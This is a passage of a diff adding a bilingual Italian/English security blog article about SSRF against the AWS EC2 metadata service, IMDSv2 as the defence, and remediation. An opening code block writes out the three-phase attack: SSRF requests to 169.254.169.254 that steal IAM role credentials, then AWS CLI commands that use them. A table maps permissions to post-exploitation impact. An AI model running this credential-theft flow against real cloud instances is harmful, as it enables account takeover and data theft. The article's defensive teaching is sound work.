+    <h3 data-it="Flusso di attacco — passo dopo passo" data-en="Attack flow — step by step">Flusso di attacco — passo dopo passo</h3>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># FASE 1 — ricognizione: esiste il ruolo?</span>
+<span class="comment"># L'attaccante inietta l'URL dell'IMDS nel parametro vulnerabile</span>
+
+<span class="neutral">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="comment"># → risposta: nome del ruolo IAM, es:</span>
+<span class="ok">ec2-app-role-prod</span>
+
+<span class="comment"># FASE 2 — furto: recupera le credenziali del ruolo</span>
+
+<span class="neutral">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role-prod</span>
+<span class="comment"># → risposta JSON:</span>
+<span class="ok">{</span>
+<span class="ok">  "Code":            "Success",</span>
+<span class="danger">  "AccessKeyId":     "ASIA4XAMPLEKEY123456",</span>
+<span class="danger">  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",</span>
+<span class="danger">  "Token":           "AQoXnyc4lcK4w...&lt;token STS lungo 1200 caratteri&gt;",</span>
+<span class="warn">  "Expiration":      "2026-03-30T14:22:00Z"</span>
+<span class="ok">}</span>
+
+<span class="comment"># FASE 3 — utilizzo: AWS CLI con le credenziali rubate</span>
+
+<span class="neutral">export AWS_ACCESS_KEY_ID=ASIA4XAMPLEKEY123456</span>
+<span class="neutral">export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span>
+<span class="neutral">export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...</span>
+
+<span class="neutral">aws sts get-caller-identity</span>
+<span class="comment"># → conferma chi sei (il ruolo dell'istanza, ora nelle tue mani)</span>
+<span class="neutral">aws s3 ls</span>
+<span class="comment"># → lista tutti i bucket accessibili al ruolo</span>
+<span class="neutral">aws iam list-attached-role-policies --role-name ec2-app-role-prod</span>
+<span class="comment"># → vediamo cosa puoi fare esattamente</span>
+
+<span class="comment"># Tempo totale dall'identificazione SSRF all'ottenimento credenziali: &lt; 60 secondi</span>
+<span class="comment"># Competenze richieste: curl, jq, AWS CLI — roba da sviluppatore junior</span>
+<span class="comment"># Scopo: educativo. Ovviamente. (Questa volta lo diciamo con più convinzione.)</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># PHASE 1 — recon: does the role exist?</span>
+<span class="comment"># Attacker injects the IMDS URL into the vulnerable parameter</span>
+
+<span class="neutral">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="comment"># → response: IAM role name, e.g.:</span>
+<span class="ok">ec2-app-role-prod</span>
+
+<span class="comment"># PHASE 2 — theft: retrieve the role credentials</span>
+
+<span class="neutral">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role-prod</span>
+<span class="comment"># → JSON response:</span>
+<span class="ok">{</span>
+<span class="ok">  "Code":            "Success",</span>
+<span class="danger">  "AccessKeyId":     "ASIA4XAMPLEKEY123456",</span>
+<span class="danger">  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",</span>
+<span class="danger">  "Token":           "AQoXnyc4lcK4w...&lt;1200-char STS token&gt;",</span>
+<span class="warn">  "Expiration":      "2026-03-30T14:22:00Z"</span>
+<span class="ok">}</span>
+
+<span class="comment"># PHASE 3 — use it: AWS CLI with stolen credentials</span>
+
+<span class="neutral">export AWS_ACCESS_KEY_ID=ASIA4XAMPLEKEY123456</span>
+<span class="neutral">export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span>
+<span class="neutral">export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...</span>
+
+<span class="neutral">aws sts get-caller-identity</span>
+<span class="comment"># → confirms who you are (the instance role, now in your hands)</span>
+<span class="neutral">aws s3 ls</span>
+<span class="comment"># → lists all buckets accessible to the role</span>
+<span class="neutral">aws iam list-attached-role-policies --role-name ec2-app-role-prod</span>
+<span class="comment"># → let's see exactly what you can do</span>
+
+<span class="comment"># Total time from SSRF discovery to credential theft: &lt; 60 seconds</span>
+<span class="comment"># Skills required: curl, jq, AWS CLI — junior developer territory</span>
+<span class="comment"># Purpose: educational. Obviously. (This time we say it with more conviction.)</span></pre>
+    </div></div>
+
+    <!-- GIF 2 — it's fine -->
+    <div style="max-width:300px;margin:1.5rem auto">
+      <div class="tenor-gif-embed" data-postid="2707234974903795898" data-share-method="host" data-aspect-ratio="1" data-width="100%">
+        <a href="https://tenor.com/view/its-fine-gif-2707234974903795898">Its Fine GIF</a> from <a href="https://tenor.com/search/its+fine-gifs">Its Fine GIFs</a>
+      </div>
+    </div>
+
+    <p
+      data-it="Tre richieste HTTP. Nessun exploit binario, nessuna shellcode, nessun Metasploit. Una SSRF che in un altro contesto sarebbe stata classificata come &lt;em&gt;low severity&lt;/em&gt; da qualche triage frettoloso — 'ah, fa solo richieste interne, non ci accede nessuno' — diventa un vettore di esfiltrazione completa dei dati. Questo è il motivo per cui SSRF è nella OWASP Top 10 dal 2021. Non per eleganza teorica. Per la combinazione letale con l'IMDS."
+      data-en="Three HTTP requests. No binary exploits, no shellcode, no Metasploit. An SSRF that in another context would have been classified as &lt;em&gt;low severity&lt;/em&gt; by some hurried triage — 'oh, it only makes internal requests, nobody accesses that' — becomes a complete data exfiltration vector. This is why SSRF has been in the OWASP Top 10 since 2021. Not for theoretical elegance. For the deadly combination with IMDS."
+    >Tre richieste HTTP. Nessun exploit binario, nessuna shellcode, nessun Metasploit. Una SSRF che in un altro contesto sarebbe stata classificata come <em>low severity</em> da qualche triage frettoloso — "ah, fa solo richieste interne, non ci accede nessuno" — diventa un vettore di esfiltrazione completa dei dati. Questo è il motivo per cui SSRF è nella OWASP Top 10 dal 2021. Non per eleganza teorica. Per la combinazione letale con l'IMDS.</p>
+
+    <!-- ═══════════════ [04] IMDSv2 ═══════════════ -->
+    <h2
+      data-it="[04] IMDSv2 — come funziona la difesa (e perché è elegante)"
+      data-en="[04] IMDSv2 — how the defense works (and why it's elegant)"
+    >[04] IMDSv2 — come funziona la difesa (e perché è elegante)</h2>
+
+    <p
+      data-it="AWS ha introdotto IMDSv2 nel novembre 2019 — guarda caso, lo stesso anno del breach Capital One (luglio 2019). &lt;em&gt;Coincidenza temporale che lasciamo alla discrezione del lettore.&lt;/em&gt; La soluzione è concettualmente semplice ma tecnicamente robusta: invece di rispondere a qualsiasi GET indiscriminata, IMDSv2 richiede prima una &lt;strong&gt;sessione autenticata&lt;/strong&gt; ottenibile solo tramite PUT con un header specifico e un TTL hop-limit di 1."
+      data-en="AWS introduced IMDSv2 in November 2019 — coincidentally, the same year as the Capital One breach (July 2019). &lt;em&gt;Temporal coincidence we leave to the reader's discretion.&lt;/em&gt; The solution is conceptually simple but technically robust: instead of responding to any indiscriminate GET, IMDSv2 requires first an &lt;strong&gt;authenticated session&lt;/strong&gt; obtainable only via PUT with a specific header and a TTL hop-limit of 1."
+    >AWS ha introdotto IMDSv2 nel novembre 2019 — guarda caso, lo stesso anno del breach Capital One (luglio 2019). <em>Coincidenza temporale che lasciamo alla discrezione del lettore.</em> La soluzione è concettualmente semplice ma tecnicamente robusta: invece di rispondere a qualsiasi GET indiscriminata, IMDSv2 richiede prima una <strong>sessione autenticata</strong> ottenibile solo tramite PUT con un header specifico e un TTL hop-limit di 1.</p>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># IMDSv2 — flusso corretto (non attaccabile via SSRF standard)</span>
+
+<span class="comment"># STEP 1: richiedi un token di sessione con TTL = 21600 secondi (6 ore)</span>
+<span class="neutral">PUT http://169.254.169.254/latest/api/token</span>
+<span class="neutral">Header: X-aws-ec2-metadata-token-ttl-seconds: 21600</span>
+<span class="comment"># ↑ Deve essere una PUT — la maggior parte dei proxy SSRF forward solo GET/POST</span>
+<span class="comment"># ↑ Il token ha TTL=1 hop (IP TTL): non può attraversare un proxy HTTP</span>
+
+<span class="ok">→ risposta: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...  (token opaco)</span>
+
+<span class="comment"># STEP 2: usa il token per ogni richiesta successiva</span>
+<span class="neutral">GET http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="neutral">Header: X-aws-ec2-metadata-token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...</span>
+
+<span class="comment"># Senza token (o con token scaduto/non valido):</span>
+<span class="danger">→ HTTP 401 Unauthorized</span>
+
+<span class="comment"># Perché il TTL hop=1 ferma la SSRF:</span>
+<span class="comment"># Attaccante → App vulnerabile (hop 1) → IMDS (hop 2) = TTL esaurito</span>
+<span class="comment"># Il pacchetto muore prima di raggiungere l'IMDS. Fine della storia.</span>
+<span class="ok"># (E finalmente il cimitero dei router smette di lavorare gratis per gli attaccanti.)</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># IMDSv2 — correct flow (not exploitable via standard SSRF)</span>
+
+<span class="comment"># STEP 1: request a session token with TTL = 21600 seconds (6 hours)</span>
+<span class="neutral">PUT http://169.254.169.254/latest/api/token</span>
+<span class="neutral">Header: X-aws-ec2-metadata-token-ttl-seconds: 21600</span>
+<span class="comment"># ↑ Must be a PUT — most SSRF proxies only forward GET/POST</span>
+<span class="comment"># ↑ Token has TTL=1 hop (IP TTL): cannot traverse an HTTP proxy</span>
+
+<span class="ok">→ response: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...  (opaque token)</span>
+
+<span class="comment"># STEP 2: use the token in every subsequent request</span>
+<span class="neutral">GET http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="neutral">Header: X-aws-ec2-metadata-token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...</span>
+
+<span class="comment"># Without token (or with expired/invalid token):</span>
+<span class="danger">→ HTTP 401 Unauthorized</span>
+
+<span class="comment"># Why TTL hop=1 stops SSRF:</span>
+<span class="comment"># Attacker → Vulnerable app (hop 1) → IMDS (hop 2) = TTL exhausted</span>
+<span class="comment"># Packet dies before reaching IMDS. End of story.</span>
+<span class="ok"># (And finally the router graveyard stops working for free for attackers.)</span></pre>
+    </div></div>
+
+    <p
+      data-it="Il meccanismo chiave è l'&lt;strong&gt;IP TTL hop limit&lt;/strong&gt;. Il token di sessione viene emesso solo se la PUT arriva con TTL = 1 — ovvero se viene da un processo che gira direttamente sull'istanza, senza attraversare nessun proxy. Un attaccante che sfrutta una SSRF è per definizione &lt;em&gt;un hop più lontano&lt;/em&gt;: la PUT viaggia dall'attaccante → all'app vulnerabile → all'IMDS, e a quel punto il TTL IP è già a zero. L'IMDS non risponde. Nessun token, nessuna GET successiva, nessuna credenziale."
+      data-en="The key mechanism is the &lt;strong&gt;IP TTL hop limit&lt;/strong&gt;. The session token is only issued if the PUT arrives with TTL = 1 — i.e., if it comes from a process running directly on the instance, without going through any proxy. An attacker exploiting SSRF is by definition &lt;em&gt;one hop further away&lt;/em&gt;: the PUT travels from attacker → to vulnerable app → to IMDS, and by then the IP TTL is already zero. IMDS doesn't respond. No token, no subsequent GET, no credentials."
+    >Il meccanismo chiave è l'<strong>IP TTL hop limit</strong>. Il token di sessione viene emesso solo se la PUT arriva con TTL = 1 — ovvero se viene da un processo che gira direttamente sull'istanza, senza attraversare nessun proxy. Un attaccante che sfrutta una SSRF è per definizione <em>un hop più lontano</em>: la PUT viaggia dall'attaccante → all'app vulnerabile → all'IMDS, e a quel punto il TTL IP è già a zero. L'IMDS non risponde. Nessun token, nessuna GET successiva, nessuna credenziale.</p>
+
+    <!-- Comparison table IMDSv1 vs IMDSv2 -->
+    <h3 data-it="Confronto diretto — IMDSv1 vs IMDSv2" data-en="Direct comparison — IMDSv1 vs IMDSv2">Confronto diretto — IMDSv1 vs IMDSv2</h3>
+
+    <table>
+      <thead>
+        <tr>
+          <th data-it="Caratteristica" data-en="Feature">Caratteristica</th>
+          <th>IMDSv1</th>
+          <th>IMDSv2</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td data-it="Autenticazione richiesta" data-en="Authentication required">Autenticazione richiesta</td>
+          <td class="danger" data-it="No — GET semplice" data-en="No — simple GET">No — GET semplice</td>
+          <td class="ok" data-it="Sì — token PUT + header" data-en="Yes — PUT token + header">Sì — token PUT + header</td>
+        </tr>
+        <tr>
+          <td data-it="Vulnerabile a SSRF" data-en="Vulnerable to SSRF">Vulnerabile a SSRF</td>
+          <td class="danger" data-it="Sì — categoricamente" data-en="Yes — categorically">Sì — categoricamente</td>
+          <td class="ok" data-it="No — TTL hop=1 blocca il proxy" data-en="No — TTL hop=1 blocks the proxy">No — TTL hop=1 blocca il proxy</td>
+        </tr>
+        <tr>
+          <td data-it="TTL hop limit" data-en="TTL hop limit">TTL hop limit</td>
+          <td class="danger" data-it="Nessuno" data-en="None">Nessuno</td>
+          <td class="ok" data-it="1 — solo richieste locali" data-en="1 — local requests only">1 — solo richieste locali</td>
+        </tr>
+        <tr>
+          <td data-it="Default nuove istanze (dal mid-2024)" data-en="Default new instances (since mid-2024)">Default nuove istanze (dal mid-2024)</td>
+          <td class="warn" data-it="Dipende dall'AMI" data-en="Depends on AMI">Dipende dall'AMI</td>
+          <td class="ok" data-it="Sì — HttpTokens: required" data-en="Yes — HttpTokens: required">Sì — HttpTokens: required</td>
+        </tr>
+        <tr>
+          <td data-it="Istanze esistenti pre-2024" data-en="Existing instances pre-2024">Istanze esistenti pre-2024</td>
+          <td class="danger">HttpTokens: optional (default)</td>
+          <td class="warn" data-it="Richiede aggiornamento manuale" data-en="Requires manual update">Richiede aggiornamento manuale</td>
+        </tr>
+        <tr>
+          <td data-it="Compatibilità SDK/librerie vecchie" data-en="Old SDK/library compatibility">Compatibilità SDK/librerie vecchie</td>
+          <td class="ok" data-it="Sempre" data-en="Always">Sempre</td>
+          <td class="warn" data-it="Richiede AWS SDK ≥ 2019" data-en="Requires AWS SDK ≥ 2019">Richiede AWS SDK ≥ 2019</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- ═══════════════ [05] IL PROBLEMA REALE ═══════════════ -->
+    <h2
+      data-it="[05] Il problema reale — HttpTokens: optional nel 2026"
+      data-en="[05] The real problem — HttpTokens: optional in 2026"
+    >[05] Il problema reale — HttpTokens: optional nel 2026</h2>
+
+    <p
+      data-it="AWS ha reso IMDSv2 il default per le nuove istanze EC2 a partire dalla metà del 2024. Tutte le AMI Amazon e quelle dei partner su AWS Marketplace usano &lt;strong&gt;HttpTokens: required&lt;/strong&gt; nei nuovi lanci via Console. Bene. Ottimo. Applausi. Il problema è che &lt;em&gt;l'infrastruttura non si sostituisce con un comunicato stampa&lt;/em&gt;. Le istanze create prima di quella data — o create successivamente da AMI non aggiornate, o da IaC legacy che specificava esplicitamente IMDSv1 — sono ancora in piedi, con HttpTokens: optional, e probabilmente nessuno le ha mai aggiornate perché &lt;em&gt;'funzionano, non tocchiamo'&lt;/em&gt;."
+      data-en="AWS made IMDSv2 the default for new EC2 instances starting mid-2024. All Amazon AMIs and partner AMIs on AWS Marketplace use &lt;strong&gt;HttpTokens: required&lt;/strong&gt; in new console launches. Good. Great. Applause. The problem is that &lt;em&gt;infrastructure doesn't get replaced by a press release&lt;/em&gt;. Instances created before that date — or created afterward from unupdated AMIs, or from legacy IaC that explicitly specified IMDSv1 — are still running, with HttpTokens: optional, and probably nobody has ever updated them because &lt;em&gt;'it works, don't touch it'&lt;/em&gt;."
+    >AWS ha reso IMDSv2 il default per le nuove istanze EC2 a partire dalla metà del 2024. Tutte le AMI Amazon e quelle dei partner su AWS Marketplace usano <strong>HttpTokens: required</strong> nei nuovi lanci via Console. Bene. Ottimo. Applausi. Il problema è che <em>l'infrastruttura non si sostituisce con un comunicato stampa</em>. Le istanze create prima di quella data — o create successivamente da AMI non aggiornate, o da IaC legacy che specificava esplicitamente IMDSv1 — sono ancora in piedi, con HttpTokens: optional, e probabilmente nessuno le ha mai aggiornate perché <em>"funzionano, non tocchiamo"</em>.</p>
+
+    <p
+      data-it='La storia si ripete — stavolta con budget cloud invece che con hardware da 40€, ma la struttura narrativa è identica. Nell&apos;articolo precedente era il PMF: un checkbox nel pannello admin del router, introdotto nel 2009, che nessuno apriva perché &lt;em&gt;"il Wi-Fi funziona"&lt;/em&gt; e aprire il pannello admin richiede di ricordare la password che è scritta sul Post-it sotto il router. Qui è HttpTokens: required: un parametro di configurazione EC2, disponibile dal 2019, che nessuno imposta perché &lt;em&gt;"l&apos;app funziona"&lt;/em&gt; e il ticket per l&apos;infrastruttura è rimasto in backlog da sei sprint. Il vettore cambia, il formato cambia, l&apos;inerzia dell&apos;operatore è invariata con una costanza che farebbe invidia a una legge fisica.'
+      data-en='The story repeats — this time with cloud budget instead of €40 hardware, but the narrative structure is identical. The previous article had PMF: a checkbox in the router admin panel, introduced in 2009, that nobody opened because &lt;em&gt;"the Wi-Fi works"&lt;/em&gt; and opening the admin panel requires remembering the password written on the Post-it under the router. Here it&apos;s HttpTokens: required: an EC2 configuration parameter, available since 2019, that nobody sets because &lt;em&gt;"the app works"&lt;/em&gt; and the infrastructure ticket has been in backlog for six sprints. The attack vector changes, the format changes, operator inertia remains constant with a consistency that would make a physical law jealous.'
+    >La storia si ripete — stavolta con budget cloud invece che con hardware da 40€ (<a href="../cardputer-adv-wifi-security/" style="color:var(--orange)">vedi Cardputer, se te lo sei perso</a>), ma la struttura narrativa è identica. In quell'articolo era il PMF: un checkbox nel pannello admin del router, introdotto nel 2009, che nessuno apriva perché <em>"il Wi-Fi funziona"</em> e aprire il pannello admin richiede di ricordare la password che è scritta sul Post-it sotto il router. Qui è HttpTokens: required: un parametro di configurazione EC2, disponibile dal 2019, che nessuno imposta perché <em>"l'app funziona"</em> e il ticket per l'infrastruttura è rimasto in backlog da sei sprint. Il vettore cambia, il formato cambia, l'inerzia dell'operatore è invariata con una costanza che farebbe invidia a una legge fisica.</p>
+
+    <div class="cve-badge">CVE-CLOUD-2019-CAPITALONE — Severity: CRITICA — Status: AMPIAMENTE EVITABILE — Patch: HttpTokens: required</div>
+
+    <div class="callout">
+      <div class="callout-label" data-it="// nota sulla diagnosi rapida (anche ripasso per la AWS Security Specialty, both ways)" data-en="// quick diagnosis note (also counts as AWS Security Specialty revision, you're welcome)">// nota sulla diagnosi rapida (anche ripasso per la AWS Security Specialty, both ways)</div>
+      <p data-it="Puoi verificare la configurazione IMDS di un'istanza con una riga: &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IMDSv2:MetadataOptions.HttpTokens}'&lt;/code&gt;. Se vedi &lt;code style='font-family:var(--mono);color:#00ff88'&gt;optional&lt;/code&gt;, hai del lavoro da fare. Se vedi &lt;code style='font-family:var(--mono);color:#00ff88'&gt;required&lt;/code&gt;, sei a posto. Se non trovi le istanze perché non hai i permessi per fare questa query, hai altri problemi — probabilmente correlati. &lt;em&gt;(Se stai studiando per la AWS Security Specialty o il SAA-C03: questo scenario è nel 90% degli exam sample questions su EC2 security. Studia con profitto.)&lt;/em&gt;" data-en="You can verify an instance's IMDS configuration with one line: &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IMDSv2:MetadataOptions.HttpTokens}'&lt;/code&gt;. If you see &lt;code style='font-family:var(--mono);color:#00ff88'&gt;optional&lt;/code&gt;, you have work to do. If you see &lt;code style='font-family:var(--mono);color:#00ff88'&gt;required&lt;/code&gt;, you're good. If you can't find the instances because you lack permissions for this query, you have other problems — probably related. &lt;em&gt;(If you're studying for AWS Security Specialty or SAA-C03: this scenario appears in 90% of EC2 security sample questions. Study well.)&lt;/em&gt;">Puoi verificare la configurazione IMDS di un'istanza con una riga: <code style="font-family:var(--mono);color:var(--orange)">aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IMDSv2:MetadataOptions.HttpTokens}'</code>. Se vedi <code style="font-family:var(--mono);color:#00ff88">optional</code>, hai del lavoro da fare. Se vedi <code style="font-family:var(--mono);color:#00ff88">required</code>, sei a posto. Se non trovi le istanze perché non hai i permessi per fare questa query, hai altri problemi — probabilmente correlati. <em>(Se stai studiando per la AWS Security Specialty o il SAA-C03: questo scenario è nel 90% degli exam sample questions su EC2 security. Studia con profitto.)</em></p>
+    </div>
+
+    <!-- ═══════════════ [06] COSA FARE CON LE CREDENZIALI ═══════════════ -->
+    <h2
+      data-it="[06] Post-exploitation — cosa ci fai con le credenziali rubate"
+      data-en="[06] Post-exploitation — what you do with stolen credentials"
+    >[06] Post-exploitation — cosa ci fai con le credenziali rubate</h2>
+
+    <p
+      data-it="La risposta dipende interamente dai permessi del ruolo IAM associato all'istanza. Il che è un secondo problema, separato ma strettamente correlato: i ruoli IAM assegnati alle istanze EC2 tendono ad accumulare permessi nel tempo con la stessa inesorabilità con cui il codice accumula technical debt. 'Abbiamo aggiunto l'accesso a quel bucket S3 per quella feature', 'abbiamo dato i permessi CloudWatch perché serviva il logging', 'abbiamo aggiunto STS assume-role perché... non ricordo più, ma il ticket era urgente'. Il risultato è un ruolo che tecnicamente dovrebbe fare tre cose e in pratica può fare trenta."
+      data-en="The answer depends entirely on the permissions of the IAM role attached to the instance. Which is a second, separate but closely related problem: IAM roles assigned to EC2 instances tend to accumulate permissions over time with the same inexorability with which code accumulates technical debt. 'We added access to that S3 bucket for that feature', 'we gave CloudWatch permissions because we needed logging', 'we added STS assume-role because... I can't remember anymore, but the ticket was urgent'. The result is a role that technically should do three things and in practice can do thirty."
+    >La risposta dipende interamente dai permessi del ruolo IAM associato all'istanza. Il che è un secondo problema, separato ma strettamente correlato: i ruoli IAM assegnati alle istanze EC2 tendono ad accumulare permessi nel tempo con la stessa inesorabilità con cui il codice accumula technical debt. "Abbiamo aggiunto l'accesso a quel bucket S3 per quella feature", "abbiamo dato i permessi CloudWatch perché serviva il logging", "abbiamo aggiunto STS assume-role perché... non ricordo più, ma il ticket era urgente". Il risultato è un ruolo che tecnicamente dovrebbe fare tre cose e in pratica può fare trenta.</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th data-it="Permesso trovato sul ruolo" data-en="Permission found on role">Permesso trovato sul ruolo</th>
+          <th data-it="Impatto potenziale" data-en="Potential impact">Impatto potenziale</th>
+          <th data-it="Livello" data-en="Level">Livello</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td data-it="<code style='font-family:var(--mono)'>s3:GetObject</code> su <code style='font-family:var(--mono)'>*</code>" data-en="<code style='font-family:var(--mono)'>s3:GetObject</code> on <code style='font-family:var(--mono)'>*</code>"><code style="font-family:var(--mono)">s3:GetObject</code> su <code style="font-family:var(--mono)">*</code></td>
+          <td data-it="Lettura di tutti i bucket dell'account — backup, log, dati clienti" data-en="Read all account buckets — backups, logs, customer data">Lettura di tutti i bucket dell'account</td>
+          <td class="danger" data-it="Critico" data-en="Critical">Critico</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">s3:*</code></td>
+          <td data-it="Lettura + scrittura + cancellazione. Ransomware cloud in kit." data-en="Read + write + delete. Cloud ransomware in a kit.">Read + write + delete. Ransomware cloud.</td>
+          <td class="danger" data-it="Critico" data-en="Critical">Critico</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">iam:CreateAccessKey</code></td>
+          <td data-it="Creazione chiavi API persistenti su altri utenti IAM — persistenza post-rotazione" data-en="Create persistent API keys on other IAM users — persistence post-rotation">Persistenza post-rotazione delle credenziali</td>
+          <td class="danger" data-it="Critico" data-en="Critical">Critico</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">sts:AssumeRole</code></td>
+          <td data-it="Escalation verso altri ruoli (incluso potenzialmente AdministratorAccess)" data-en="Escalation to other roles (including potentially AdministratorAccess)">Escalation verso altri ruoli</td>
+          <td class="danger" data-it="Critico" data-en="Critical">Critico</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">ec2:DescribeInstances</code></td>
+          <td data-it="Ricognizione: lista completa infrastruttura, IP, security group" data-en="Recon: full infrastructure list, IPs, security groups">Ricognizione infrastruttura completa</td>
+          <td class="warn" data-it="Alto" data-en="High">Alto</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">secretsmanager:GetSecretValue</code></td>
+          <td data-it="Accesso diretto a tutti i segreti (DB passwords, API keys, certificati)" data-en="Direct access to all secrets (DB passwords, API keys, certificates)">Accesso diretto a tutti i secrets</td>
+          <td class="danger" data-it="Critico" data-en="Critical">Critico</td>
+        </tr>
+        <tr>
+          <td><code style="font-family:var(--mono)">lambda:InvokeFunction</code></td>
+          <td data-it="Esecuzione arbitraria di Lambda — potenziale escalation laterale" data-en="Arbitrary Lambda execution — potential lateral escalation">Esecuzione codice arbitrario via Lambda</td>
+          <td class="warn" data-it="Alto" data-en="High">Alto</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p
+      data-it="La tabella sopra non è teoria. È la lista di permessi che si trovano regolarmente in pen test su istanze EC2 di ambienti di staging (e, con un'allarmante frequenza, di produzione) che si autodefiniscono 'sicuri'. Il principio del least privilege — dare a ogni risorsa solo i permessi strettamente necessari — è universalmente predicato e selettivamente applicato. Di solito viene applicato &lt;em&gt;dopo&lt;/em&gt; l'incidente."
+      data-en="The table above is not theory. It's the list of permissions regularly found during pen tests on EC2 instances in staging environments (and, with alarming frequency, production) that self-describe as 'secure'. The principle of least privilege — giving each resource only strictly necessary permissions — is universally preached and selectively applied. It's usually applied &lt;em&gt;after&lt;/em&gt; the incident."
+    >La tabella sopra non è teoria. È la lista di permessi che si trovano regolarmente in pen test su istanze EC2 di ambienti di staging (e, con un'allarmante frequenza, di produzione) che si autodefiniscono "sicuri". Il principio del least privilege — dare a ogni risorsa solo i permessi strettamente necessari — è universalmente predicato e selettivamente applicato. Di solito viene applicato <em>dopo</em> l'incidente.</p>
+
+    <!-- ═══════════════ [07] REMEDIATION ═══════════════ -->
+    <h2
+      data-it="[07] Remediation — le solite checkbox che nessuno apre"
+      data-en="[07] Remediation — the usual checkboxes nobody opens"
+    >[07] Remediation — le solite checkbox che nessuno apre</h2>
+
+    <p
+      data-it="La buona notizia: la remediation è genuinamente semplice. Non richiede riprogettare l'architettura, non richiede downtime significativo, non richiede budget. Richiede di fare tre cose che avreste dovuto fare nel 2019 e probabilmente non avete fatto. Nessun giudizio — l'importante è farle ora."
+      data-en="The good news: the remediation is genuinely simple. It doesn't require redesigning the architecture, it doesn't require significant downtime, it doesn't require budget. It requires doing three things you should have done in 2019 and probably didn't. No judgment — the important thing is to do them now."
+    >La buona notizia: la remediation è genuinamente semplice. Non richiede riprogettare l'architettura, non richiede downtime significativo, non richiede budget. Richiede di fare tre cose che avreste dovuto fare nel 2019 e probabilmente non avete fatto. Nessun giudizio — l'importante è farle ora.</p>
+
+    <h3 data-it="1. Forza IMDSv2 su tutte le istanze" data-en="1. Enforce IMDSv2 on all instances">1. Forza IMDSv2 su tutte le istanze</h3>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># Patch istanza singola esistente — senza restart necessario</span>
+<span class="neutral">aws ec2 modify-instance-metadata-options \</span>
+<span class="neutral">  --instance-id i-0a1b2c3d4e5f67890 \</span>
+<span class="neutral">  --http-tokens required \</span>
+<span class="neutral">  --http-endpoint enabled</span>
+
+<span class="comment"># Forza IMDSv2 come default per tutte le nuove istanze nella region</span>
+<span class="neutral">aws ec2 modify-instance-metadata-defaults \</span>
+<span class="neutral">  --region eu-west-1 \</span>
+<span class="neutral">  --http-tokens required</span>
+
+<span class="comment"># Verifica: elenca tutte le istanze con il loro stato IMDS</span>
+<span class="neutral">aws ec2 describe-instances \</span>
+<span class="neutral">  --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens,State.Name]' \</span>
+<span class="neutral">  --output table</span>
+
+<span class="comment"># SCP (Service Control Policy) — per impedire che chiunque lanci istanze IMDSv1</span>
+<span class="comment"># nell'intera AWS Organization (la vera difesa enterprise):</span>
+<span class="comment"># {</span>
+<span class="comment">#   "Effect": "Deny",</span>
+<span class="comment">#   "Action": "ec2:RunInstances",</span>
+<span class="comment">#   "Condition": {</span>
+<span class="comment">#     "StringNotEquals": { "ec2:MetadataHttpTokens": "required" }</span>
+<span class="comment">#   }</span>
+<span class="comment"># }</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># Patch existing single instance — no restart required</span>
+<span class="neutral">aws ec2 modify-instance-metadata-options \</span>
+<span class="neutral">  --instance-id i-0a1b2c3d4e5f67890 \</span>
+<span class="neutral">  --http-tokens required \</span>
+<span class="neutral">  --http-endpoint enabled</span>
+
+<span class="comment"># Enforce IMDSv2 as default for all new instances in the region</span>
+<span class="neutral">aws ec2 modify-instance-metadata-defaults \</span>
+<span class="neutral">  --region eu-west-1 \</span>
+<span class="neutral">  --http-tokens required</span>
+
+<span class="comment"># Verify: list all instances with their IMDS status</span>
+<span class="neutral">aws ec2 describe-instances \</span>
+<span class="neutral">  --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens,State.Name]' \</span>
+<span class="neutral">  --output table</span>
+
+<span class="comment"># SCP (Service Control Policy) — prevent anyone from launching IMDSv1 instances</span>
+<span class="comment"># across the entire AWS Organization (the real enterprise defense):</span>
+<span class="comment"># {</span>
+<span class="comment">#   "Effect": "Deny",</span>
+<span class="comment">#   "Action": "ec2:RunInstances",</span>
+<span class="comment">#   "Condition": {</span>
